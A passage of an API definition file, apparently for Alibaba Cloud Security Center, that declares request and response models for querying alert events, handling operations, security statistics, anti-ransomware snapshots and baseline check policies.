  ](name='Suggestions', description='The suggestions on how to handle the risks.'),
  totalCount?: int32(name='TotalCount', description='The total number of unhandled security risks.', example='15'),
}

model DescribeSecureSuggestionResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSecureSuggestionResponseBody(name='body'),
}

async function describeSecureSuggestion(request: DescribeSecureSuggestionRequest): DescribeSecureSuggestionResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeSecureSuggestion', 'POST', '/', 'json', false, 'json', request);
}

model DescribeSecurityCheckScheduleConfigRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  resourceOwnerId?: long(name='ResourceOwnerId', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX', position='Query'),
}

model DescribeSecurityCheckScheduleConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='48D2E9A9-A1B0-4295-B727-0995757C47E9'),
  riskCheckJobConfig?: {
    daysOfWeek?: string(name='DaysOfWeek', description='The day of the week when the check tasks are performed. Multiple days can be specified. Multiple days are separated by commas (,).

*   **1**: Monday
*   **2**: Tuesday
*   **3**: Wednesday
*   **4**: Thursday
*   **5**: Friday
*   **6**: Saturday
*   **7**: Sunday', example='1,2,3'),
    endTime?: int32(name='EndTime', description='The time range during which check tasks end. Valid values:

*   **6**: 00:00 to 06:00
*   **12**: 06:00 to 12:00
*   **18**: 12:00 to 18:00
*   **24**: 18:00 to 24:00', example='12'),
    startTime?: int32(name='StartTime', description='The time range during which check tasks start. Valid values:

*   **0**: 00:00 to 06:00
*   **6**: 06:00 to 12:00
*   **12**: 12:00 to 18:00
*   **18**: 18:00 to 24:00', example='6'),
  }(name='RiskCheckJobConfig', description='The configurations of custom check tasks.'),
}

model DescribeSecurityCheckScheduleConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSecurityCheckScheduleConfigResponseBody(name='body'),
}

/**
  * @deprecated
  * This operation is phased out. You can use the GetCheckConfig operation.
  *
 */
// Deprecated
async function describeSecurityCheckScheduleConfig(request: DescribeSecurityCheckScheduleConfigRequest): DescribeSecurityCheckScheduleConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeSecurityCheckScheduleConfig', 'POST', '/', 'json', false, 'json', request);
}

model DescribeSecurityEventMarkMissListRequest {
  currentPage: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  eventName?: string(name='EventName', description='The name of the alert event. The value indicates a subtype.', example='Login with unusual location', position='Query'),
  pageSize: int32(name='PageSize', description='The number of entries per page. Default value: **20**.', example='20', position='Query'),
  remark?: string(name='Remark', description='The condition that is used to query alert events by asset. You can enter an IP address, a public IP address, an internal IP address, or an asset name for fuzzy match.', example='192.168.XX.XX', position='Query'),
  resourceOwnerId?: long(name='ResourceOwnerId', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='125.210.XX.XX', position='Query'),
}

model DescribeSecurityEventMarkMissListResponseBody = {
  list?: [ 
    {
      aliUid?: long(name='AliUid', description='The user ID.', example='176618589410****'),
      eventName?: string(name='EventName', description='The name of the alert event. The value indicates a subtype.', example='Login with unusual location'),
      eventNameOriginal?: string(name='EventNameOriginal', description='The name of the alert event. The value indicates a type.', example='login_common_location'),
      eventType?: string(name='EventType', description='The subtype of the alert event.', example='Unusual Logon'),
      eventTypeOriginal?: string(name='EventTypeOriginal', description='The type of the alert event.', example='login_common_location'),
      field?: string(name='Field', description='The field that is used in the whitelist rule.', example='type'),
      fieldValue?: string(name='FieldValue', description='The value of the field.', example='root'),
      filedAliasName?: string(name='FiledAliasName', description='The alias of the field.', example='Logon Time'),
      id?: long(name='Id', description='The ID of the rule.', example='104037'),
      instanceId?: string(name='InstanceId', description='The instance ID of the server.', example='rm-bp1e8t4q15sr3****'),
      instanceName?: string(name='InstanceName', description='The instance name of the asset.', example='sql-test-001'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='8.210.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='172.25.XX.XX'),
      operate?: string(name='Operate', description='The operator. Valid values:

- **contains**: contains
- **notContains**: does not contain
- **strEqual**: equals
- **strNotEqual**: does not equal
- **regex**: regular expression', example='contains'),
      uuid?: string(name='Uuid', description='The UUID of the asset.', example='49e25e0f-bb51-4a5a-a1b3-13a4ddaa****'),
    }
  ](name='List', description='The ID of the rule.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='9'),
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: **20**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='200'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
}

model DescribeSecurityEventMarkMissListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSecurityEventMarkMissListResponseBody(name='body'),
}

async function describeSecurityEventMarkMissList(request: DescribeSecurityEventMarkMissListRequest): DescribeSecurityEventMarkMissListResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeSecurityEventMarkMissList', 'POST', '/', 'json', false, 'json', request);
}

model DescribeSecurityEventOperationStatusRequest {
  resourceOwnerId?: long(name='ResourceOwnerId', position='Query'),
  securityEventIds: [ string ](name='SecurityEventIds', description='The IDs of the alert events.

>  You must specify at least one of the TaskId and SecurityEventIds parameters.', example='["909361"]', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX', position='Query'),
  taskId: long(name='TaskId', description='The ID of the task that handles the alert events.

>  You must specify at least one of the TaskId and SecurityEventIds parameters.', example='12121', position='Query'),
}

model DescribeSecurityEventOperationStatusResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='1683940A-E4AE-4473-8C40-F4075434B76B'),
  securityEventOperationStatusResponse?: {
    securityEventOperationStatuses?: [ 
      {
        errorCode?: string(name='ErrorCode', description='The code that indicates the handling result of the alert event.', example='ignore.Success'),
        securityEventId?: string(name='SecurityEventId', description='The ID of the alert event.', example='12321'),
        status?: string(name='Status', description='The handling status of the alert event. Valid values:

*   **Processing**: The alert event is being handled.
*   **Success**: The alert event is handled.
*   **Failed**: The alert event failed to be handled.', example='Success'),
      }
    ](name='SecurityEventOperationStatuses', description='An array consisting of the status of the alert events handled by the task.'),
    taskStatus?: string(name='TaskStatus', description='The status of the task that handles the alert events. Valid values:

*   **Processing**: The task is running.
*   **Success**: The task is successful.
*   **Failure**: The task failed.
*   **Pending**: The task is pending.', example='Success'),
  }(name='SecurityEventOperationStatusResponse', description='The information about the task that handles the alert events.'),
}

model DescribeSecurityEventOperationStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSecurityEventOperationStatusResponseBody(name='body'),
}

async function describeSecurityEventOperationStatus(request: DescribeSecurityEventOperationStatusRequest): DescribeSecurityEventOperationStatusResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeSecurityEventOperationStatus', 'POST', '/', 'json', false, 'json', request);
}

model DescribeSecurityEventOperationsRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  resourceOwnerId?: long(name='ResourceOwnerId', position='Query'),
  securityEventId: long(name='SecurityEventId', description='The ID of the alert event that you want to handle.', example='61352054', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX', position='Query'),
}

model DescribeSecurityEventOperationsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='B7A2000F-497E-5DA0-B14D-615CD410DD7E'),
  securityEventOperationsResponse?: [ 
    {
      markField?: [ 
        {
          filedAliasName?: string(name='FiledAliasName', description='The alias of the field that is used in the whitelist rule.', example='file path'),
          filedName?: string(name='FiledName', description='The field that is used in the whitelist rule.', example='gmtModified'),
          markMisType?: string(name='MarkMisType', description='The operation that is used in the whitelist rule. Valid values:

*   **contains**: contains
*   **notContains**: does not contain
*   **regex**: regular expression
*   **strEqual**: equals
*   **strNotEqual**: does not equal', example='contains'),
          markMisValue?: string(name='MarkMisValue', description='The value of the field that is used in the whitelist rule.', example='2022-04-25 10:11:04'),
          supportedMisType?: [ string ](name='SupportedMisType', description='An array consisting of the operations that are supported by the method to add the alert event to the whitelist.'),
          uuid?: string(name='Uuid', description='The UUID of the server on which the alert event is detected.', example='3d6b4a75-c28f-447b-9142-38f6252c****'),
        }
      ](name='MarkField', description='An array consisting of the configuration information that is used when the value of the OperationCode parameter is **advance\\_mark\\_mis_info**.'),
      markFieldsSource?: [ 
        {
          filedAliasName?: string(name='FiledAliasName', description='The alias of the field that can be used in the whitelist rule.', example='file path'),
          filedName?: string(name='FiledName', description='The field that can be used in the whitelist rule.', example='gmtModified'),
          markMisValue?: string(name='MarkMisValue', description='The value of the field that can be used in the whitelist rule.', example='contains'),
          supportedMisType?: [ string ](name='SupportedMisType', description='An array consisting of the operations that are supported by the method to add the alert event to the whitelist.'),
        }
      ](name='MarkFieldsSource', description='An array consisting of the configuration items that can be used when the value of the OperationCode parameter is advance_mark_mis_info.'),
      operationCode?: string(name='OperationCode', description='The operation that you can perform to handle the alert. Valid values:

*   **block_ip**: blocks the source IP address.
*   **advance\\_mark\\_mis_info**: adds the alert to the whitelist.
*   **ignore**: ignores the alert.
*   **manual_handled**: marks the alert as manually handled.
*   **kill_process**: terminates the malicious process.
*   **cleanup**: performs in-depth virus detection and removal.
*   **kill\\_and_quara**: terminates the malicious process and quarantines the source file.
*   **disable\\_malicious_defense**: stops the container on which the alerting files or processes exist.
*   **client\\_problem_check**: performs troubleshooting.
*   **quara**: quarantines the source file of the malicious process.', example='advance_mark_mis_info'),
      operationParams?: string(name='OperationParams', description='The configuration of the operation that you can perform to handle the alert event.

>  If the value of the OperationCode parameter is `kill_and_quara` or `block_ip`, the OperationParams parameter is required. If the value of the OperationCode parameter is a different value, the OperationParams parameter can be left empty.', example='{"expireTime":1641566807783}'),
      userCanOperate?: boolean(name='UserCanOperate', description='Indicates whether you can handle the alert event in the current edition of Security Center. Valid values:

*   **true**: yes
*   **false**: no', example='false'),
    }
  ](name='SecurityEventOperationsResponse', description='An array consisting of the operations that you can perform to handle the alert event.'),
}

model DescribeSecurityEventOperationsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSecurityEventOperationsResponseBody(name='body'),
}

async function describeSecurityEventOperations(request: DescribeSecurityEventOperationsRequest): DescribeSecurityEventOperationsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeSecurityEventOperations', 'POST', '/', 'json', false, 'json', request);
}

model DescribeSecurityStatInfoRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  resourceDirectoryAccountId?: string(name='ResourceDirectoryAccountId', description='The ID of the account that is added to the resource directory as a member for multi-account control. You can use this parameter to query the security status of the account.', example='12345', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX', position='Query'),
}

model DescribeSecurityStatInfoResponseBody = {
  attackEvent?: {
    dateArray?: [ string ](name='DateArray', description='The points in time when the number of attacks is collected in the trend chart.'),
    totalCount?: int32(name='TotalCount', description='The total number of attacks on the current day.', example='1096'),
    valueArray?: [ string ](name='ValueArray', description='The numbers of attacks at all points in time.'),
  }(name='AttackEvent', description='The detailed statistics of attacks.'),
  healthCheck?: {
    dateArray?: [ string ](name='DateArray', description='The points in time when data of baseline risk items is collected in the trend chart.'),
    highCount?: int32(name='HighCount', description='The number of baseline risk items that have the high-risk level on the current day.', example='10'),
    highList?: [ string ](name='HighList', description='The numbers of baseline risk items that have the high-risk level at all points in time.'),
    levelsOn?: [ string ](name='LevelsOn', description='The risk levels of baseline risk items.'),
    lowCount?: int32(name='LowCount', description='The number of baseline risk items that have the low-risk level on the current day.', example='0'),
    lowList?: [ string ](name='LowList', description='The numbers of baseline risk items that have the low-risk level at all points in time.'),
    mediumCount?: int32(name='MediumCount', description='The number of baseline risk items that have the medium-risk level on the current day.', example='21'),
    mediumList?: [ string ](name='MediumList', description='The numbers of baseline risk items that have the medium-risk level at all points in time.'),
    timeArray?: [ string ](name='TimeArray', description='The time periods during which data of baseline risk items is collected.'),
    totalCount?: int32(name='TotalCount', description='The total number of baseline risk items on the current day.', example='32'),
    valueArray?: [ string ](name='ValueArray', description='The total number of baseline risk items at all points in time.'),
  }(name='HealthCheck', description='The detailed statistics of baseline risk items.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A3E61730-85E2-4789-8017-B9B1B70F0568'),
  securityEvent?: {
    dateArray?: [ string ](name='DateArray', description='The points in time when data of unhandled alerts is collected in the trend chart.'),
    levelsOn?: [ string ](name='LevelsOn', description='The risk levels of unhandled alerts.'),
    remindCount?: int32(name='RemindCount', description='The number of **remind** alerts on the current day.', example='0'),
    remindList?: [ string ](name='RemindList', description='The numbers of remind alerts at all points in time.'),
    seriousCount?: int32(name='SeriousCount', description='The number of **serious** alerts on the current day.', example='404'),
    seriousList?: [ string ](name='SeriousList', description='The numbers of serious alerts at all points in time.'),
    suspiciousCount?: int32(name='SuspiciousCount', description='The number of **suspicious** alerts on the current day.', example='148'),
    suspiciousList?: [ string ](name='SuspiciousList', description='The numbers of suspicious alerts at all points in time.'),
    timeArray?: [ string ](name='TimeArray', description='The time periods during which data of the same alert is collected.'),
    totalCount?: int32(name='TotalCount', description='The total number of unhandled alerts on the current day.', example='552'),
    valueArray?: [ string ](name='ValueArray', description='The numbers of unhandled alerts at all points in time.'),
  }(name='SecurityEvent', description='The detailed statistics of unhandled alerts.'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
  vulnerability?: {
    asapCount?: int32(name='AsapCount', description='The number of **high-risk** unfixed vulnerabilities on the current day.', example='109'),
    asapList?: [ string ](name='AsapList', description='The numbers of high-risk unfixed vulnerabilities at all points in time.'),
    dateArray?: [ string ](name='DateArray', description='The points in time when data of unfixed vulnerabilities is collected in the trend chart.'),
    laterCount?: int32(name='LaterCount', description='The number of **medium-risk** unfixed vulnerabilities on the current day.', example='275'),
    laterList?: [ string ](name='LaterList', description='The numbers of medium-risk unfixed vulnerabilities at all points in time.'),
    levelsOn?: [ string ](name='LevelsOn', description='The risk levels of unfixed vulnerabilities.'),
    nntfCount?: int32(name='NntfCount', description='The number of **low-risk** unfixed vulnerabilities on the current day.', example='0'),
    nntfList?: [ string ](name='NntfList', description='The numbers of low-risk unfixed vulnerabilities at all points in time.'),
    timeArray?: [ string ](name='TimeArray', description='The time periods during which data of unfixed vulnerabilities is collected.'),
    totalCount?: int32(name='TotalCount', description='The total number of unfixed vulnerabilities on the current day.', example='384'),
    valueArray?: [ string ](name='ValueArray', description='The numbers of unfixed vulnerabilities at all points in time.'),
  }(name='Vulnerability', description='The detailed statistics of unfixed vulnerabilities.'),
}

model DescribeSecurityStatInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSecurityStatInfoResponseBody(name='body'),
}

async function describeSecurityStatInfo(request: DescribeSecurityStatInfoRequest): DescribeSecurityStatInfoResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeSecurityStatInfo', 'POST', '/', 'json', false, 'json', request);
}

model DescribeServiceLinkedRoleStatusRequest {
  serviceLinkedRole?: string(name='ServiceLinkedRole', description='The service-linked role. Default value: **AliyunServiceRoleForSas**. Valid values:

*   **AliyunServiceRoleForSas**: the service-linked role of Security Center. Security Center assumes this role to access the resources of other cloud services within your account.
*   **AliyunServiceRoleForSasCspm**: the service-linked role of Security Center-CSPM. Security Center-CSPM assumes this role to access the resources of other cloud services within your account.', example='AliyunServiceRoleForSas', position='Query'),
}

model DescribeServiceLinkedRoleStatusResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='39CE98F4-88C0-4539-B906-6B542E5C07B9'),
  roleStatus?: {
    status?: boolean(name='Status', description='Indicates whether the service-linked role is created. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  }(name='RoleStatus', description='The status information about the service-linked role.'),
}

model DescribeServiceLinkedRoleStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeServiceLinkedRoleStatusResponseBody(name='body'),
}

async function describeServiceLinkedRoleStatus(request: DescribeServiceLinkedRoleStatusRequest): DescribeServiceLinkedRoleStatusResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeServiceLinkedRoleStatus', 'POST', '/', 'json', false, 'json', request);
}

model DescribeSimilarEventScenariosRequest {
  resourceOwnerId?: long(name='ResourceOwnerId', position='Query'),
  securityEventId: long(name='SecurityEventId', example='12321', position='Query'),
  sourceIp?: string(name='SourceIp', example='1.2.XX.XX', position='Query'),
}

model DescribeSimilarEventScenariosResponseBody = {
  requestId?: string(name='RequestId', example='FDF7B8D9-8493-4B90-8D13-E0C1FFCE5F97'),
  scenarios?: [ 
    {
      code?: string(name='Code', example='same_url'),
    }
  ](name='Scenarios'),
}

model DescribeSimilarEventScenariosResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSimilarEventScenariosResponseBody(name='body'),
}

async function describeSimilarEventScenarios(request: DescribeSimilarEventScenariosRequest): DescribeSimilarEventScenariosResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeSimilarEventScenarios', 'POST', '/', 'json', false, 'json', request);
}

model DescribeSimilarSecurityEventsRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20', position='Query'),
  resourceOwnerId?: long(name='ResourceOwnerId', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX', position='Query'),
  taskId: long(name='TaskId', description='The task ID. You can call the [CreateSimilarSecurityEventsQueryTask](~~CreateSimilarSecurityEventsQueryTask~~) operation to obtain the task ID.', example='1689135', position='Query'),
}

model DescribeSimilarSecurityEventsResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='5'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='5'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='9F4217C8-763F-51EF-84D4-5535E072B2D8'),
  securityEventsResponse?: [ 
    {
      eventName?: string(name='EventName', description='The name of the alert event.', example='Trojan'),
      eventType?: string(name='EventType', description='The type of the alert event. Valid values:

*   Suspicious Process
*   Webshell
*   Unusual Logon
*   Malicious Software
*   Sensitive File Tampering
*   Unusual Network Connection
*   Other
*   Suspicious Account
*   Cloud threat detection
*   Precision defense
*   Application Whitelist
*   Persistence
*   Web Application Threat Detection
*   Malicious scripts
*   Malicious Network Activity
*   K8s Abnormal Behavior
*   Website backdoor (local engine)
*   Exploit
*   Image Scan
*   Trusted exception

For more information about alert types, see [Overview](~~68388~~).', example='Malicious Software'),
      lastTime?: long(name='LastTime', description='The timestamp generated when the alert event was last detected. Unit: milliseconds.', example='1648544361480'),
      occurrenceTime?: long(name='OccurrenceTime', description='The timestamp generated when the alert event was first detected. Unit: milliseconds.', example='1648457961000'),
      securityEventId?: long(name='SecurityEventId', description='The ID of the alert event.', example='158661'),
      uuid?: string(name='Uuid', description='The UUID of the server that was affected by the alert event.', example='qweeqq-13232-daweq-w****'),
    }
  ](name='SecurityEventsResponse', description='The information about the alert events that are triggered by the same rule or of the same alert type.'),
}

model DescribeSimilarSecurityEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSimilarSecurityEventsResponseBody(name='body'),
}

async function describeSimilarSecurityEvents(request: DescribeSimilarSecurityEventsRequest): DescribeSimilarSecurityEventsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeSimilarSecurityEvents', 'POST', '/', 'json', false, 'json', request);
}

model DescribeSnapshotsRequest {
  apiVersion: string(name='ApiVersion', description='The version of the anti-ransomware policy. Valid values:

*   **1.0.0**
*   **2.0.0**', example='2.0.0', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  isAliYunEcs?: string(name='IsAliYunEcs', description='Specifies whether the server is an Elastic Compute Service (ECS) instance. Valid values:

*   **true**: yes
*   **false**: no', example='true', position='Query'),
  machineRegion?: string(name='MachineRegion', description='The region in which the server resides.', example='us-east-1', position='Query'),
  machineRemark?: string(name='MachineRemark', description='The name or IP address of the server.', example='192.168.XX.XX', position='Query'),
  nextToken?: string(name='NextToken', description='The starting position of the query. If this parameter is left empty, the query starts from the beginning.

>  If you call the operation for the first time, you do not need to specify the parameter. The response to the first call contains the token that can be used for the second call. Each subsequent response contains the token that can be used for the next call.', example='CAESGgoSChAKDGNvbXBsZXRlVGltZRABCgQiAggAGAAiQAoJAB4SwmEAAAAACjMDLgAAADFTNzMyZDMwMzAzMDM0NzY3YTZjNjI3NjZmNmU3MjcxNjk3NDY5MzY3MjY4****', position='Query'),
  pageSize: int32(name='PageSize', description='The number of entries to return on each page.', example='20', position='Query'),
  statusList?: string(name='StatusList', description='The status of backup snapshots from which data can be restored. Valid values:

*   **COMPLETE**: complete
*   **PARTIAL_COMPLETE**: partial complete', example='["COMPLETE"]', position='Query'),
  uuid?: string(name='Uuid', description='The UUID of the server.

>  You can call the [DescribeBackupPolicy](~~DescribeBackupPolicy~~) operation to query the UUIDs of servers.', example='061d8042-59ff-416e-bc33-294a1cf5****', position='Query'),
}

model DescribeSnapshotsResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    nextToken?: string(name='NextToken', description='The token that is used to initiate the next call.', example='CAESGgoSChAKDGNvbXBsZXRlVGltZRABCgQiAggAGAAiQAoJAGYXFWIAAAAACjMDLgAAADFTNzMyZDMwMzAzMDM1Mzc3Njc4MzA2ODY5NmI2YTY1Nzg2NTcxNjE2NDc4****'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='149'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB393****'),
  snapshots?: [ 
    {
      actualBytes?: long(name='ActualBytes', description='The actual data amount of backup snapshots after duplicates are removed. Unit: bytes.', example='686188****'),
      actualItems?: long(name='ActualItems', description='The actual number of backup objects.

>  This parameter is available only for file backup.', example='123'),
      bytesDone?: long(name='BytesDone', description='The actual amount of data that is generated by incremental backup. Unit: bytes.', example='800'),
      bytesTotal?: long(name='BytesTotal', description='The total data amount of the data source. Unit: bytes.', example='3484541815****'),
      clientId?: string(name='ClientId', description='This parameter is returned only if the value of the **SourceType** parameter is **ECS_FILE**. This parameter indicates the ID of the Hybrid Backup Recovery (HBR) agent.', example='c-000dbefaw9f7gnbw****'),
      clientVersion?: string(name='ClientVersion', description='The version of the anti-ransomware agent.', example='2.10.0'),
      createdTime?: long(name='CreatedTime', description='The time when the backup snapshot was created. The value is a UNIX timestamp. Unit: seconds.', example='1646793988'),
      errorFile?: string(name='ErrorFile', description='The file that records the information about backup failures, including the information about partially completed backup tasks.', example='s-0008ndhgrflh55i5****.csv'),
      instanceId?: string(name='InstanceId', description='The ID of the ECS instance.', example='i-2ze78zfakirgh1yl****'),
      itemsDone?: long(name='ItemsDone', description='The number of backup objects.

>  This parameter is available only for file backup.', example='6'),
      itemsTotal?: long(name='ItemsTotal', description='The total number of objects in the data source.

>  This parameter is available only for file backup.', example='7'),
      jobId?: string(name='JobId', description='The ID of the backup task.', example='job-000a2q5vg6awgo01****'),
      parentSnapshotHash?: string(name='ParentSnapshotHash', description='The hash value of the parent backup snapshot.', example='a0181606689c9562f092b3190bddb8a62bb5a24784424ba2102bc7fe92ae****'),
      path?: string(name='Path', description='This parameter is returned only if the value of the **SourceType** parameter is **ECS_FILE**. This parameter indicates the path to the backup files.', example='["/home"]'),
      paths?: [ string ](name='Paths', description='This parameter is returned only if the value of the **SourceType** parameter is **NAS**. This parameter indicates the path to the backup files.'),
      planId?: string(name='PlanId', description='The ID of the backup plan.', example='plan-000ee8gh2ljelsnb****'),
      regionId?: string(name='RegionId', description='The ID of the region in which backup snapshot is stored.', example='us-east-1'),
      retention?: long(name='Retention', description='The retention period of the backup snapshot.', example='7'),
      snapshotHash?: string(name='SnapshotHash', description='The hash value of the backup snapshot.', example='9ee47cf12351e4ddecce8c12f4957d3946cd96fbe24cd4ab264c7200839d****'),
      snapshotId?: string(name='SnapshotId', description='The ID of the backup snapshot.', example='s-0003ahfuqpjdztsg****'),
      sourceType?: string(name='SourceType', description='The type of the data source. Valid values:

*   **ECS_FILE**: ECS files
*   **OSS**: Object Storage Service (OSS) buckets
*   **NAS**: Apsara File Storage NAS file systems
*   **OTS_TABLE**: Tablestore instances', example='ECS_FILE'),
      status?: string(name='Status', description='The status of backup tasks. Valid values:

*   **COMPLETE**: complete
*   **PARTIAL_COMPLETE**: partial complete
*   **FAILED**: failed', example='COMPLETE'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='d332af48-1269-4a55-a6db-8543a80f****'),
      vaultId?: string(name='VaultId', description='The ID of the backup vault that stores the backup snapshot.', example='v-000ccok3zmw7fbzz****'),
    }
  ](name='Snapshots', description='An array that consists of the backup snapshots.'),
}

model DescribeSnapshotsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSnapshotsResponseBody(name='body'),
}

async function describeSnapshots(request: DescribeSnapshotsRequest): DescribeSnapshotsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeSnapshots', 'POST', '/', 'json', false, 'json', request);
}

model DescribeStrategyRequest {
  customType?: string(name='CustomType', description='The type of the baseline check policy that you want to query. Valid values:

*   **common**: standard baseline check policy
*   **custom**: custom baseline check policy', example='custom', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.X.X', position='Query'),
  strategyIds?: string(name='StrategyIds', description='The ID of the baseline check policy that you want to query. Separate multiple IDs with commas (,).', example='8164248', position='Query'),
}

model DescribeStrategyResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='75C127E6-76CD-59A7-B6E4-1CBBDC98F2EB'),
  strategies?: [ 
    {
      configTargets?: [ 
        {
          flag?: string(name='Flag', description='Indicates whether the baseline check policy is applied to the asset group. Valid values:

*   **add**: The baseline check policy is applied to the asset group.
*   **del**: the baseline check policy is not applied to the asset group.', example='add'),
          target?: string(name='Target', description='The asset group ID or UUID of the asset to which the baseline check policy is applied.', example='10099713'),
          targetType?: string(name='TargetType', description='The condition by which the baseline check policy is applied to the asset. Valid values:

*   **groupId**: the ID of the asset group
*   **uuid**: the UUID of the asset', example='groupId'),
        }
      ](name='ConfigTargets', description='The details of the assets to which the baseline check policy is applied.'),
      customType?: string(name='CustomType', description='The type of the baseline check policy. Valid values:

*   **common**
*   **custom**', example='custom'),
      cycleDays?: int32(name='CycleDays', description='The cycle of the baseline check. Valid values:

*   **1**: every 2 days
*   **3**: every 4 days
*   **7**: every 8 days
*   30: every 31 days', example='1'),
      cycleStartTime?: int32(name='CycleStartTime', description='The time when the baseline check starts. Valid values:

*   **0**: The baseline check starts within the time range from 00:00 to 06:00.
*   **6**: The baseline check starts within the time range from 06:00 to 12:00.
*   **12**: The baseline check starts within the time range from 12:00 to 18:00.
*   **18**: The baseline check starts within the time range from 18:00 to 24:00.', example='0'),
      ecsCount?: int32(name='EcsCount', description='The number of the assets to which the baseline check policy is applied.', example='50'),
      endTime?: string(name='EndTime', description='The end time of the baseline check policy.', example='03:00:00'),
      execStatus?: int32(name='ExecStatus', description='The status of the baseline check policy. Valid values:

*   **1**: not executed
*   **2**: executing', example='1'),
      id?: int32(name='Id', description='The ID of the baseline check policy.', example='8164248'),
      name?: string(name='Name', description='The name of the baseline check policy.', example='text2'),
      passRate?: int32(name='PassRate', description='The proportion of risky baselines in the baseline check result.', example='0'),
      processRate?: int32(name='ProcessRate', description='The number of the assets on which the baseline check is complete.', example='20'),
      riskCount?: int32(name='RiskCount', description='The number of baseline check items in the baseline check policy.', example='23'),
      startTime?: string(name='StartTime', description='The start time of the baseline check policy.', example='00:00:00'),
